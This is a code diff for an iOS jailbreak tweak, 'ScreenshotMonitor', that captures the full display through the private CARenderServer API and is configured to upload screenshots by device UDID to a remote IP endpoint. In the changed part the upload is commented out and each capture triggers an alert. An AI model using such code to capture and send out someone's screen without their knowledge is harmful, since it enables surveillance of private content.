@@ -2,6 +2,8 @@
 #import <Foundation/Foundation.h>
 #import <SpringBoard/SpringBoard.h>
 #import <AudioToolbox/AudioToolbox.h>
+#import "CARenderServer.h"
+#import <CoreGraphics/CoreGraphics.h>
 
 // Configuration - Change these values
 static NSString *API_ENDPOINT = @"https://186.190.215.38:3000/screenshots/device/";
@@ -40,38 +42,68 @@ static NSString *DEVICE_ID = nil; // Will be set to device UDID
 
 %new
 -(void)captureAndUploadScreenshot {
-    UIImage *screenshot = [self takeScreenshot];
-    if (screenshot) {
-        AudioServicesPlaySystemSound(kSystemSoundID_Vibrate); // Vibrate if screenshot is captured
-        NSLog(@"[ScreenshotMonitor] Screenshot captured successfully!");
-    } else {
-        NSLog(@"[ScreenshotMonitor] Failed to capture screenshot");
-    }
+    dispatch_async(dispatch_get_main_queue(), ^{
+        @autoreleasepool {
+            UIImage *screenshot = [self takeScreenshot];
+            if (screenshot) {
+                AudioServicesPlaySystemSound(kSystemSoundID_Vibrate);
+                NSLog(@"[ScreenshotMonitor] Screenshot captured successfully!");
+
+                // Show a visual alert
+                UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"ScreenshotMonitor"
+                                                                               message:@"Screenshot captured!"
+                                                                        preferredStyle:UIAlertControllerStyleAlert];
+                // Dismiss after 1 second
+                dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
+                    [alert dismissViewControllerAnimated:YES completion:nil];
+                });
+                // Present the alert
+                UIWindow *keyWindow = [UIApplication sharedApplication].keyWindow;
+                [keyWindow.rootViewController presentViewController:alert animated:YES completion:nil];
+
+                // Optionally upload in background
+                // dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
+                //     [self uploadScreenshot:screenshot];
+                // });
+            } else {
+                NSLog(@"[ScreenshotMonitor] Failed to capture screenshot");
+                AudioServicesPlaySystemSound(1007);
+            }
+        }
+    });
 }
 
 %new
 -(UIImage *)takeScreenshot {
     @try {
-        // Get key window
-        UIWindow *keyWindow = nil;
-        NSArray *windows = [[UIApplication sharedApplication] windows];
-        for (UIWindow *window in windows) {
-            if (window.isKeyWindow) {
-                keyWindow = window;
-                break;
-            }
+        UIScreen *mainScreen = [UIScreen mainScreen];
+        CGFloat scale = mainScreen.scale;
+        CGRect bounds = mainScreen.bounds;
+
+        CGSize size = bounds.size;
+        size.width *= scale;
+        size.height *= scale;
+
+        CGBitmapInfo bitmapInfo = kCGImageAlphaNoneSkipFirst | kCGBitmapByteOrder32Little;
+        CGColorSpaceRef colorSpace = CGColorSpaceCreateDeviceRGB();
+
+        CGContextRef context = CGBitmapContextCreate(NULL, size.width, size.height, 8, 0, colorSpace, bitmapInfo);
+        CGColorSpaceRelease(colorSpace);
+
+        if (!context) {
+            NSLog(@"[ScreenshotMonitor] Failed to create bitmap context");
+            return nil;
         }
-        
-        if (!keyWindow) {
-            keyWindow = windows.firstObject;
-        }
-        
-        // Create graphics context and render view
-        UIGraphicsBeginImageContextWithOptions(keyWindow.bounds.size, NO, 0.0);
-        [keyWindow drawViewHierarchyInRect:keyWindow.bounds afterScreenUpdates:YES];
-        UIImage *screenshot = UIGraphicsGetImageFromCurrentImageContext();
-        UIGraphicsEndImageContext();
-        
+
+        // Render the display
+        CARenderServerRenderDisplay(0, CFSTR("LCD"), context, bounds, 0);
+
+        CGImageRef imageRef = CGBitmapContextCreateImage(context);
+        UIImage *screenshot = [UIImage imageWithCGImage:imageRef scale:scale orientation:UIImageOrientationUp];
+
+        CGImageRelease(imageRef);
+        CGContextRelease(context);
+
         return screenshot;
     } @catch (NSException *exception) {
         NSLog(@"[ScreenshotMonitor] Exception taking screenshot: %@", exception);
